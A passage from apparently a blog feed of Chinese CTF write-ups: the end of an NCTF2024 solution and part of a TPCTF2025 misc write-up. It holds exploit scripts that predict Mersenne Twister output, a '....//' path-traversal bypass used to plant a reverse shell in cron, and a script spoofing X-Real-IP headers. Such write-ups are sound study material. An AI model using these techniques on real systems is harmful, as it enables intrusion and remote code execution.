class="string">b&#x27;~&#x27;</span>,drop=<span class="literal">True</span>).strip().decode())</span><br><span class="line">    n2 = <span class="built_in">int</span>(io.recvline().strip().decode()) - n1</span><br><span class="line">    whatls.extend(<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(n1)[<span class="number">2</span>:].zfill(<span class="number">16</span>))</span><br><span class="line">    whatls.extend(<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(n2)[<span class="number">2</span>:].zfill(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">weapon_data = [<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,whatls[-<span class="number">32</span>:-<span class="number">16</span>])),<span class="number">2</span>),<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,whatls[-<span class="number">16</span>:])),<span class="number">2</span>)]</span><br><span class="line">weapon_data[<span class="number">1</span>] += weapon_data[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># map a linear transformation matrix</span></span><br><span class="line"><span class="string"># compute for first time only, afterwards comment this section for memory &amp; time conservation</span></span><br><span class="line"><span class="string">mt = []</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(19968):</span></span><br><span class="line"><span class="string">    f_stats = [0] * 19968</span></span><br><span class="line"><span class="string">    f_stats[i] = 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    state = [int(&#x27;&#x27;.join(map(str,f_stats[i*32:(i+1)*32])),2) for i in range(624)]</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    r = Random()</span></span><br><span class="line"><span class="string">    r.setstate((3,tuple(state+[624]),None))</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    vc = []</span></span><br><span class="line"><span class="string">    vc.extend(int(i) for i in bin(r.getrandbits(64))[2:].zfill(64))</span></span><br><span class="line"><span class="string">    for _ in range(622): # 624 - 2 = 622</span></span><br><span class="line"><span class="string">        vc.extend(int(i) for i in bin(getrandbits(16))[2:].zfill(16))</span></span><br><span class="line"><span class="string">        vc.extend(int(i) for i in bin(getrandbits(16))[2:].zfill(16))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mt.append(vc)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">save(mt,&#x27;mt.sobj&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">t0 = time()</span><br><span class="line">mt = load(<span class="string">&#x27;mt.sobj&#x27;</span>) <span class="comment">#matrix(GF(2),...)</span></span><br><span class="line"><span class="built_in">breakpoint</span>()</span><br><span class="line">resvec = vector(GF(<span class="number">2</span>),whatls)</span><br><span class="line">init = mt.solve_left(resvec)</span><br><span class="line"></span><br><span class="line">impl_state = [<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,init[i*<span class="number">32</span>:(i+<span class="number">1</span>)*<span class="number">32</span>])),<span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>)]</span><br><span class="line"></span><br><span class="line">rn = Random()</span><br><span class="line">rn.setstate((<span class="number">3</span>,<span class="built_in">tuple</span>(impl_state+[<span class="number">624</span>]),<span class="literal">None</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1244</span>): <span class="comment"># 622*2</span></span><br><span class="line">    rn.getrandbits(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    x_grid = rn.randrange(<span class="number">2025</span>)</span><br><span class="line">    y_grid = rn.randrange(<span class="number">2025</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;option:&#x27;</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;aim:&#x27;</span>,<span class="string">f&#x27;<span class="subst">&#123;x_grid&#125;</span> <span class="subst">&#123;y_grid&#125;</span>&#x27;</span>.encode())</span><br><span class="line">    rn.randint(weapon_data[<span class="number">0</span>],weapon_data[<span class="number">1</span>])</span><br><span class="line">    io.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Victory&#x27;</span> <span class="keyword">in</span> io.recvline():</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;time = <span class="subst">&#123;time() - t0:<span class="number">.2</span>f&#125;</span>s&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="二阶段"><a href="#二阶段" class="headerlink" title="二阶段"></a>二阶段</h4><p>成功进入第二阶段，这部分在题目中没有给出源码</p><p><img src="/images/NCTF2024-X1crypsc%E3%80%81%E8%B0%81%E5%8A%A8%E4%BA%86%E6%88%91%E7%9A%84MC%EF%BC%9F-Official-Writeup/791b2ab0-657e-4114-972c-d73f57aff16a.png" alt="img"></p><p>其实经过简单尝试就能发现，这里只是过滤了..&#x2F;而且要求文件名不能以&#x2F;开头，我们通过双写<code>....//</code>就能绕过做到目录穿越。这里我们可以向定时任务写入反弹shell的命令。但是有一点要注意的是，定时任务的命令结尾必须以换行符结束，可以参考<a href="https://zahui.fan/posts/63d10d9c/">这篇文章</a>。因此，我们在输入内容后要记得再换一下行，输入一个空格（什么都不写是换不成功的）。</p><blockquote><p>其实也可以直接去改task.py，但这里就展示一下定时任务的做法了</p></blockquote><p><img src="/images/NCTF2024-X1crypsc%E3%80%81%E8%B0%81%E5%8A%A8%E4%BA%86%E6%88%91%E7%9A%84MC%EF%BC%9F-Official-Writeup/f3a5ac4c-b6da-46d0-b356-fe558199de37.png" alt="img"></p><p><img src="/images/NCTF2024-X1crypsc%E3%80%81%E8%B0%81%E5%8A%A8%E4%BA%86%E6%88%91%E7%9A%84MC%EF%BC%9F-Official-Writeup/60f8fd93-1e90-4f17-a902-b8ae82060fdc.png" alt="img"></p><p>flag在题目进程的环境变量里</p><p><img src="/images/NCTF2024-X1crypsc%E3%80%81%E8%B0%81%E5%8A%A8%E4%BA%86%E6%88%91%E7%9A%84MC%EF%BC%9F-Official-Writeup/a54ef8c1-ebfa-4663-90f5-73796641058b.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> NCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TPCTF2025 misc writeup+复现</title>
      <link href="/posts/f0a22888/"/>
      <url>/posts/f0a22888/</url>
      
        <content type="html"><![CDATA[<h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="raenil"><a href="#raenil" class="headerlink" title="raenil"></a>raenil</h4><blockquote><p>做完就瞎了</p></blockquote><p>给了一个GIF，是被拉伸变形的二维码。</p><p>从掩码可以看出左边的图是正着的，右边的是倒着的。</p><p>不会p图，硬看然后qrazybox手动恢复，干就完了。</p><p><img src="/images/TPCTF2025-misc-writeup-%E5%A4%8D%E7%8E%B0/image-20250308180735477.png" alt="image-20250308180735477"></p><p>padding bits recovery自动填充一下</p><p><img src="/images/TPCTF2025-misc-writeup-%E5%A4%8D%E7%8E%B0/image-20250308180853635.png" alt="image-20250308180853635"></p><p>然后reed  solomon decoder解码就行</p><p><img src="/images/TPCTF2025-misc-writeup-%E5%A4%8D%E7%8E%B0/image-20250308181238532.png" alt="image-20250308181238532"></p><h4 id="nanonymous-spam"><a href="#nanonymous-spam" class="headerlink" title="nanonymous spam"></a>nanonymous spam</h4><p>观察可以发现，用户名与ip有关，肯定是要伪造ip，但是XFF头好像没用，试了下这里X-Real-IP头可以用。</p><p>后面就是找ip和用户名的对应关系。用户名总共由四个部分构成，本来以为就是每个部分对应了一个字典，后来发现中间这四个部分之间存在换位的现象，但实际上用的仍然是四个互不相交的字典，最终测出来具体规律如下：</p><p>一个部分用的是一个长度为103的字典，这个部分永远是第一个变化的，因此周期是103个ip；</p><p>一个部分用的是一个长度为512的字典，这个部分是第二个变化的，因此周期是103*512个ip；</p><p>一个部分用的是一个长度为313的字典，这个部分是第三个变化的，因此周期是103*512*313个ip；</p><p>最后一个部分则是每103*512*313个ip变化一次。</p><p>前三个部分在第一次发生换位之前就能根据周期很容易地测出来，下面是测最后这个部分所用的脚本，简单来说就是如果发现元素不属于前三个部分的字典，那它就是属于最后这个部分，这样后面不管怎么换位我们都能精准地找到这一部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">increment_ip</span>(<span class="params">ip</span>):</span><br><span class="line">    ip_int = <span class="built_in">int</span>(ipaddress.IPv4Address(ip))</span><br><span class="line"></span><br><span class="line">    ip_int += <span class="number">103</span>*<span class="number">512</span>*<span class="number">313</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip_int &gt; <span class="built_in">int</span>(ipaddress.IPv4Address(<span class="string">&#x27;255.255.255.255&#x27;</span>)):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(ipaddress.IPv4Address(ip_int))</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://1.95.184.40:8520/&quot;</span></span><br><span class="line">headers_template = &#123;</span><br><span class="line">    <span class="string">&#x27;X-Real-IP&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;h2&gt;Post a Message&lt;/h2&gt;\s*&lt;div class=&quot;username&quot;&gt;User: (.+?)&lt;/div&gt;&#x27;</span>, re.DOTALL)</span><br><span class="line"></span><br><span class="line">current_ip = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">first=[<span class="string">&#x27;Nod&#x27;</span>, <span class="string">&#x27;Tap&#x27;</span>, <span class="string">&#x27;Liz&#x27;</span>, <span class="string">&#x27;Mel&#x27;</span>, <span class="string">&#x27;Fig&#x27;</span>, <span class="string">&#x27;Rif&#x27;</span>, <span class="string">&#x27;Rip&#x27;</span>, <span class="string">&#x27;Pud&#x27;</span>, <span class="string">&#x27;Foo&#x27;</span>, <span class="string">&#x27;Haw&#x27;</span>, <span class="string">&#x27;Wef&#x27;</span>, <span class="string">&#x27;Kel&#x27;</span>, <span class="string">&#x27;Gat&#x27;</span>, <span class="string">&#x27;Hod&#x27;</span>, <span class="string">&#x27;Mom&#x27;</span>, <span class="string">&#x27;Lin&#x27;</span>, <span class="string">&#x27;Fez&#x27;</span>, <span class="string">&#x27;Rua&#x27;</span>, <span class="string">&#x27;Fay&#x27;</span>, <span class="string">&#x27;Pat&#x27;</span>, <span class="string">&#x27;Ned&#x27;</span>, <span class="string">&#x27;Taz&#x27;</span>, <span class="string">&#x27;Sid&#x27;</span>, <span class="string">&#x27;Mic&#x27;</span>, <span class="string">&#x27;Nom&#x27;</span>, <span class="string">&#x27;Hab&#x27;</span>, <span class="string">&#x27;Rug&#x27;</span>, <span class="string">&#x27;Men&#x27;</span>, <span class="string">&#x27;Nok&#x27;</span>, <span class="string">&#x27;Fun&#x27;</span>, <span class="string">&#x27;Pox&#x27;</span>, <span class="string">&#x27;Red&#x27;</span>, <span class="string">&#x27;Jah&#x27;</span>, <span class="string">&#x27;Tet&#x27;</span>, <span class="string">&#x27;Hip&#x27;</span>, <span class="string">&#x27;Tem&#x27;</span>, <span class="string">&#x27;Bad&#x27;</span>, <span class="string">&#x27;Mir&#x27;</span>, <span class="string">&#x27;Taj&#x27;</span>, <span class="string">&#x27;Maf&#x27;</span>, <span class="string">&#x27;Rac&#x27;</span>, <span class="string">&#x27;Zia&#x27;</span>, <span class="string">&#x27;Hea&#x27;</span>, <span class="string">&#x27;Fis&#x27;</span>, <span class="string">&#x27;Dem&#x27;</span>, <span class="string">&#x27;Bim&#x27;</span>, <span class="string">&#x27;Gow&#x27;</span>, <span class="string">&#x27;Hub&#x27;</span>, <span class="string">&#x27;Job&#x27;</span>, <span class="string">&#x27;Nex&#x27;</span>, <span class="string">&#x27;Jas&#x27;</span>, <span class="string">&#x27;Lie&#x27;</span>, <span class="string">&#x27;Sim&#x27;</span>, <span class="string">&#x27;Poc&#x27;</span>, <span class="string">&#x27;Ran&#x27;</span>, <span class="string">&#x27;Voa&#x27;</span>, <span class="string">&#x27;Gig&#x27;</span>, <span class="string">&#x27;Jes&#x27;</span>, <span class="string">&#x27;Nie&#x27;</span>, <span class="string">&#x27;Lal&#x27;</span>, <span class="string">&#x27;Lek&#x27;</span>, <span class="string">&#x27;Pen&#x27;</span>, <span class="string">&#x27;Cos&#x27;</span>, <span class="string">&#x27;Col&#x27;</span>, <span class="string">&#x27;Nao&#x27;</span>, <span class="string">&#x27;Mop&#x27;</span>, <span class="string">&#x27;Bac&#x27;</span>, <span class="string">&#x27;Cis&#x27;</span>, <span class="string">&#x27;Mor&#x27;</span>, <span class="string">&#x27;Vim&#x27;</span>, <span class="string">&#x27;Ceo&#x27;</span>, <span class="string">&#x27;Gic&#x27;</span>, <span class="string">&#x27;Mii&#x27;</span>, <span class="string">&#x27;Dep&#x27;</span>, <span class="string">&#x27;Len&#x27;</span>, <span class="string">&#x27;Few&#x27;</span>, <span class="string">&#x27;Lob&#x27;</span>, <span class="string">&#x27;Lea&#x27;</span>, <span class="string">&#x27;Bec&#x27;</span>, <span class="string">&#x27;Mui&#x27;</span>, <span class="string">&#x27;Pec&#x27;</span>, <span class="string">&#x27;Mab&#x27;</span>, <span class="string">&#x27;Her&#x27;</span>, <span class="string">&#x27;Tas&#x27;</span>, <span class="string">&#x27;Tui&#x27;</span>, <span class="string">&#x27;Kun&#x27;</span>, <span class="string">&#x27;Vic&#x27;</span>, <span class="string">&#x27;Too&#x27;</span>, <span class="string">&#x27;Woe&#x27;</span>, <span class="string">&#x27;Uav&#x27;</span>, <span class="string">&#x27;Dam&#x27;</span>, <span class="string">&#x27;Jin&#x27;</span>, <span class="string">&#x27;Kaz&#x27;</span>, <span class="string">&#x27;Yew&#x27;</span>, <span class="string">&#x27;Cid&#x27;</span>, <span class="string">&#x27;Jaw&#x27;</span>, <span class="string">&#x27;Hay&#x27;</span>, <span class="string">&#x27;Gib&#x27;</span>, <span class="string">&#x27;Mis&#x27;</span>, <span class="string">&#x27;Til&#x27;</span>, <span class="string">&#x27;Six&#x27;</span>, <span class="string">&#x27;Bot&#x27;</span>, <span class="string">&#x27;Guo&#x27;</span>]</span><br><span class="line">second=[<span class="string">&#x27;Wim&#x27;</span>, <span class="string">&#x27;Het&#x27;</span>, <span class="string">&#x27;Fau&#x27;</span>, <span class="string">&#x27;Ria&#x27;</span>, <span class="string">&#x27;Dio&#x27;</span>, <span class="string">&#x27;God&#x27;</span>, <span class="string">&#x27;Man&#x27;</span>, <span class="string">&#x27;Lim&#x27;</span>, <span class="string">&#x27;Fap&#x27;</span>, <span class="string">&#x27;Bar&#x27;</span>, <span class="string">&#x27;Sot&#x27;</span>, <span class="string">&#x27;Uae&#x27;</span>, <span class="string">&#x27;Faq&#x27;</span>, <span class="string">&#x27;Gum&#x27;</span>, <span class="string">&#x27;Doe&#x27;</span>, <span class="string">&#x27;Kay&#x27;</span>, <span class="string">&#x27;Vol&#x27;</span>, <span class="string">&#x27;Bic&#x27;</span>, <span class="string">&#x27;Ren&#x27;</span>, <span class="string">&#x27;Sox&#x27;</span>, <span class="string">&#x27;Ral&#x27;</span>, <span class="string">&#x27;Pii&#x27;</span>, <span class="string">&#x27;Fol&#x27;</span>, <span class="string">&#x27;Noo&#x27;</span>, <span class="string">&#x27;Wes&#x27;</span>, <span class="string">&#x27;Law&#x27;</span>, <span class="string">&#x27;Pic&#x27;</span>, <span class="string">&#x27;Zig&#x27;</span>, <span class="string">&#x27;Ric&#x27;</span>, <span class="string">&#x27;Tad&#x27;</span>, <span class="string">&#x27;Pav&#x27;</span>, <span class="string">&#x27;Loo&#x27;</span>, <span class="string">&#x27;Tea&#x27;</span>, <span class="string">&#x27;Koh&#x27;</span>, <span class="string">&#x27;Fia&#x27;</span>, <span class="string">&#x27;Rep&#x27;</span>, <span class="string">&#x27;Soa&#x27;</span>, <span class="string">&#x27;Gog&#x27;</span>, <span class="string">&#x27;Rim&#x27;</span>, <span class="string">&#x27;Nec&#x27;</span>, <span class="string">&#x27;Jun&#x27;</span>, <span class="string">&#x27;Sus&#x27;</span>, <span class="string">&#x27;Roh&#x27;</span>, <span class="string">&#x27;Sac&#x27;</span>, <span class="string">&#x27;Diy&#x27;</span>, <span class="string">&#x27;Gin&#x27;</span>, <span class="string">&#x27;Gul&#x27;</span>, <span class="string">&#x27;Via&#x27;</span>, <span class="string">&#x27;Tec&#x27;</span>, <span class="string">&#x27;Mah&#x27;</span>, <span class="string">&#x27;Rus&#x27;</span>, <span class="string">&#x27;Cal&#x27;</span>, <span class="string">&#x27;Wat&#x27;</span>, <span class="string">&#x27;Mes&#x27;</span>, <span class="string">&#x27;Pam&#x27;</span>, <span class="string">&#x27;Sav&#x27;</span>, <span class="string">&#x27;Luz&#x27;</span>, <span class="string">&#x27;Lac&#x27;</span>, <span class="string">&#x27;Jud&#x27;</span>, <span class="string">&#x27;Lop&#x27;</span>, <span class="string">&#x27;Tub&#x27;</span>, <span class="string">&#x27;Lia&#x27;</span>, <span class="string">&#x27;Kip&#x27;</span>, <span class="string">&#x27;Nau&#x27;</span>, <span class="string">&#x27;Loa&#x27;</span>, <span class="string">&#x27;Roa&#x27;</span>, <span class="string">&#x27;Dos&#x27;</span>, <span class="string">&#x27;Nor&#x27;</span>, <span class="string">&#x27;Jaz&#x27;</span>, <span class="string">&#x27;Fim&#x27;</span>, <span class="string">&#x27;Boo&#x27;</span>, <span class="string">&#x27;Pad&#x27;</span>, <span class="string">&#x27;Duo&#x27;</span>, <span class="string">&#x27;Min&#x27;</span>, <span class="string">&#x27;Vis&#x27;</span>, <span class="string">&#x27;Hux&#x27;</span>, <span class="string">&#x27;Cue&#x27;</span>, <span class="string">&#x27;Soc&#x27;</span>, <span class="string">&#x27;Caw&#x27;</span>, <span class="string">&#x27;Rig&#x27;</span>, <span class="string">&#x27;Wod&#x27;</span>, <span class="string">&#x27;Pag&#x27;</span>, <span class="string">&#x27;Tak&#x27;</span>, <span class="string">&#x27;Cag&#x27;</span>, <span class="string">&#x27;Coe&#x27;</span>, <span class="string">&#x27;Lev&#x27;</span>, <span class="string">&#x27;Ted&#x27;</span>, <span class="string">&#x27;Vax&#x27;</span>, <span class="string">&#x27;Peo&#x27;</span>, <span class="string">&#x27;Uic&#x27;</span>, <span class="string">&#x27;Cus&#x27;</span>, <span class="string">&#x27;Huh&#x27;</span>, <span class="string">&#x27;Rub&#x27;</span>, <span class="string">&#x27;Gia&#x27;</span>, <span class="string">&#x27;Raf&#x27;</span>, <span class="string">&#x27;Bed&#x27;</span>, <span class="string">&#x27;Pei&#x27;</span>, <span class="string">&#x27;Sig&#x27;</span>, <span class="string">&#x27;Pur&#x27;</span>, <span class="string">&#x27;Qin&#x27;</span>, <span class="string">&#x27;Dai&#x27;</span>, <span class="string">&#x27;Deb&#x27;</span>, <span class="string">&#x27;Pof&#x27;</span>, <span class="string">&#x27;Neg&#x27;</span>, <span class="string">&#x27;Tol&#x27;</span>, <span class="string">&#x27;Lux&#x27;</span>, <span class="string">&#x27;Jus&#x27;</span>, <span class="string">&#x27;Uah&#x27;</span>, <span class="string">&#x27;Que&#x27;</span>, <span class="string">&#x27;Noe&#x27;</span>, <span class="string">&#x27;Lov&#x27;</span>, <span class="string">&#x27;Zee&#x27;</span>, <span class="string">&#x27;Con&#x27;</span>, <span class="string">&#x27;Fey&#x27;</span>, <span class="string">&#x27;Soi&#x27;</span>, <span class="string">&#x27;Tex&#x27;</span>, <span class="string">&#x27;Pin&#x27;</span>, <span class="string">&#x27;Kap&#x27;</span>, <span class="string">&#x27;Sal&#x27;</span>, <span class="string">&#x27;Luo&#x27;</span>, <span class="string">&#x27;Tim&#x27;</span>, <span class="string">&#x27;Mid&#x27;</span>, <span class="string">&#x27;Daw&#x27;</span>, <span class="string">&#x27;Had&#x27;</span>, <span class="string">&#x27;Gam&#x27;</span>, <span class="string">&#x27;Jul&#x27;</span>, <span class="string">&#x27;Jie&#x27;</span>, <span class="string">&#x27;Wol&#x27;</span>, <span class="string">&#x27;Mon&#x27;</span>, <span class="string">&#x27;Roc&#x27;</span>, <span class="string">&#x27;Rel&#x27;</span>, <span class="string">&#x27;Bas&#x27;</span>, <span class="string">&#x27;Nou&#x27;</span>, <span class="string">&#x27;Reo&#x27;</span>, <span class="string">&#x27;Mar&#x27;</span>, <span class="string">&#x27;Dao&#x27;</span>, <span class="string">&#x27;Niu&#x27;</span>, <span class="string">&#x27;Kev&#x27;</span>, <span class="string">&#x27;Dee&#x27;</span>, <span class="string">&#x27;Wip&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;Coc&#x27;</span>, <span class="string">&#x27;Fes&#x27;</span>, <span class="string">&#x27;Rat&#x27;</span>, <span class="string">&#x27;Dig&#x27;</span>, <span class="string">&#x27;Teu&#x27;</span>, <span class="string">&#x27;Mob&#x27;</span>, <span class="string">&#x27;Mae&#x27;</span>, <span class="string">&#x27;Car&#x27;</span>, <span class="string">&#x27;Tux&#x27;</span>, <span class="string">&#x27;Dew&#x27;</span>, <span class="string">&#x27;Xue&#x27;</span>, <span class="string">&#x27;Poi&#x27;</span>, <span class="string">&#x27;Sit&#x27;</span>, <span class="string">&#x27;Xin&#x27;</span>, <span class="string">&#x27;Per&#x27;</span>, <span class="string">&#x27;Mos&#x27;</span>, <span class="string">&#x27;Top&#x27;</span>, <span class="string">&#x27;Gab&#x27;</span>, <span class="string">&#x27;Yin&#x27;</span>, <span class="string">&#x27;Loi&#x27;</span>, <span class="string">&#x27;Jay&#x27;</span>, <span class="string">&#x27;Moi&#x27;</span>, <span class="string">&#x27;Yeo&#x27;</span>, <span class="string">&#x27;Day&#x27;</span>, <span class="string">&#x27;Dic&#x27;</span>, <span class="string">&#x27;Haq&#x27;</span>, <span class="string">&#x27;Dak&#x27;</span>, <span class="string">&#x27;Mer&#x27;</span>, <span class="string">&#x27;Wii&#x27;</span>, <span class="string">&#x27;Pix&#x27;</span>, <span class="string">&#x27;Fag&#x27;</span>, <span class="string">&#x27;Dog&#x27;</span>, <span class="string">&#x27;Por&#x27;</span>, <span class="string">&#x27;Nib&#x27;</span>, <span class="string">&#x27;Hog&#x27;</span>, <span class="string">&#x27;Huw&#x27;</span>, <span class="string">&#x27;Voc&#x27;</span>, <span class="string">&#x27;Hob&#x27;</span>, <span class="string">&#x27;Zep&#x27;</span>, <span class="string">&#x27;Neo&#x27;</span>, <span class="string">&#x27;Com&#x27;</span>, <span class="string">&#x27;Seo&#x27;</span>, <span class="string">&#x27;Cur&#x27;</span>, <span class="string">&#x27;Mow&#x27;</span>, <span class="string">&#x27;Reb&#x27;</span>, <span class="string">&#x27;Jim&#x27;</span>, <span class="string">&#x27;Noc&#x27;</span>, <span class="string">&#x27;Big&#x27;</span>, <span class="string">&#x27;Fin&#x27;</span>, <span class="string">&#x27;Sek&#x27;</span>, <span class="string">&#x27;Fav&#x27;</span>, <span class="string">&#x27;Niv&#x27;</span>, <span class="string">&#x27;Pom&#x27;</span>, <span class="string">&#x27;Pes&#x27;</span>, <span class="string">&#x27;Ker&#x27;</span>, <span class="string">&#x27;Yao&#x27;</span>, <span class="string">&#x27;Coq&#x27;</span>, <span class="string">&#x27;Tif&#x27;</span>, <span class="string">&#x27;Gem&#x27;</span>, <span class="string">&#x27;Cel&#x27;</span>, <span class="string">&#x27;Zit&#x27;</span>, <span class="string">&#x27;Toc&#x27;</span>, <span class="string">&#x27;Jet&#x27;</span>, <span class="string">&#x27;Vow&#x27;</span>, <span class="string">&#x27;Lon&#x27;</span>, <span class="string">&#x27;Rev&#x27;</span>, <span class="string">&#x27;Joi&#x27;</span>, <span class="string">&#x27;Jem&#x27;</span>, <span class="string">&#x27;Wad&#x27;</span>, <span class="string">&#x27;Bom&#x27;</span>, <span class="string">&#x27;Tar&#x27;</span>, <span class="string">&#x27;Pua&#x27;</span>, <span class="string">&#x27;Rao&#x27;</span>, <span class="string">&#x27;Bio&#x27;</span>, <span class="string">&#x27;For&#x27;</span>, <span class="string">&#x27;Dec&#x27;</span>, <span class="string">&#x27;Win&#x27;</span>, <span class="string">&#x27;See&#x27;</span>, <span class="string">&#x27;Pup&#x27;</span>, <span class="string">&#x27;Mea&#x27;</span>, <span class="string">&#x27;Fam&#x27;</span>, <span class="string">&#x27;Muh&#x27;</span>, <span class="string">&#x27;Doo&#x27;</span>, <span class="string">&#x27;Moh&#x27;</span>, <span class="string">&#x27;Sam&#x27;</span>, <span class="string">&#x27;Maw&#x27;</span>, <span class="string">&#x27;Tog&#x27;</span>, <span class="string">&#x27;Moe&#x27;</span>, <span class="string">&#x27;Tin&#x27;</span>, <span class="string">&#x27;Hur&#x27;</span>, <span class="string">&#x27;Won&#x27;</span>, <span class="string">&#x27;Lox&#x27;</span>, <span class="string">&#x27;Poa&#x27;</span>, <span class="string">&#x27;Dun&#x27;</span>, <span class="string">&#x27;Run&#x27;</span>, <span class="string">&#x27;Bil&#x27;</span>, <span class="string">&#x27;Vip&#x27;</span>, <span class="string">&#x27;Viv&#x27;</span>, <span class="string">&#x27;Del&#x27;</span>, <span class="string">&#x27;Nae&#x27;</span>, <span class="string">&#x27;Zip&#x27;</span>, <span class="string">&#x27;Roo&#x27;</span>, <span class="string">&#x27;Sum&#x27;</span>, <span class="string">&#x27;Leh&#x27;</span>, <span class="string">&#x27;Lam&#x27;</span>, <span class="string">&#x27;Yoo&#x27;</span>, <span class="string">&#x27;Yip&#x27;</span>, <span class="string">&#x27;Tow&#x27;</span>, <span class="string">&#x27;Pil&#x27;</span>, <span class="string">&#x27;Nab&#x27;</span>, <span class="string">&#x27;Goi&#x27;</span>, <span class="string">&#x27;Gar&#x27;</span>, <span class="string">&#x27;Qua&#x27;</span>, <span class="string">&#x27;Cor&#x27;</span>, <span class="string">&#x27;Hav&#x27;</span>, <span class="string">&#x27;Let&#x27;</span>, <span class="string">&#x27;Ree&#x27;</span>, <span class="string">&#x27;Set&#x27;</span>, <span class="string">&#x27;Lee&#x27;</span>, <span class="string">&#x27;Cef&#x27;</span>, <span class="string">&#x27;Jam&#x27;</span>, <span class="string">&#x27;Fal&#x27;</span>, <span class="string">&#x27;Daa&#x27;</span>, <span class="string">&#x27;Put&#x27;</span>, <span class="string">&#x27;Num&#x27;</span>, <span class="string">&#x27;Vod&#x27;</span>, <span class="string">&#x27;Tis&#x27;</span>, <span class="string">&#x27;Cad&#x27;</span>, <span class="string">&#x27;Mot&#x27;</span>, <span class="string">&#x27;Rit&#x27;</span>, <span class="string">&#x27;Lex&#x27;</span>, <span class="string">&#x27;Nav&#x27;</span>, <span class="string">&#x27;Sia&#x27;</span>, <span class="string">&#x27;Lip&#x27;</span>, <span class="string">&#x27;Nox&#x27;</span>, <span class="string">&#x27;Raj&#x27;</span>, <span class="string">&#x27;Pie&#x27;</span>, <span class="string">&#x27;Hel&#x27;</span>, <span class="string">&#x27;Bam&#x27;</span>, <span class="string">&#x27;Fed&#x27;</span>, <span class="string">&#x27;Los&#x27;</span>, <span class="string">&#x27;Fax&#x27;</span>, <span class="string">&#x27;Neh&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;Jag&#x27;</span>, <span class="string">&#x27;Sec&#x27;</span>, <span class="string">&#x27;Jap&#x27;</span>, <span class="string">&#x27;Sun&#x27;</span>, <span class="string">&#x27;Cea&#x27;</span>, <span class="string">&#x27;Jug&#x27;</span>, <span class="string">&#x27;Sis&#x27;</span>, <span class="string">&#x27;Cut&#x27;</span>, <span 